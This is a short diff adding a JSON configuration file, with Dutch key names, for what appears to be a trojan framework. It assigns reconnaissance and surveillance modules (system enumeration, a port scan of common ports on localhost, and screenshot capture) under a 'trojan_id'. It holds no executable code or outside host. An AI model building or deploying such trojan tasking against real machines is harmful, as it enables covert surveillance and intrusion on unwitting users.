@@ -1,0 +1,26 @@
+{
+    "trojan_id": "default",
+    "modules": [
+        {
+            "naam": "system_enum",
+            "params": {
+                "uitgebreid": true
+            }
+        },
+        {
+            "naam": "portscan",
+            "params": {
+                "target": "127.0.0.1",
+                "poorten": [22, 80, 443, 3389, 8080]
+            }
+        },
+        {
+            "naam": "screenshot",
+            "params": {}
+        }
+    ],
+    "instellingen": {
+        "debug_mode": false,
+        "max_retries": 3
+    }
+}
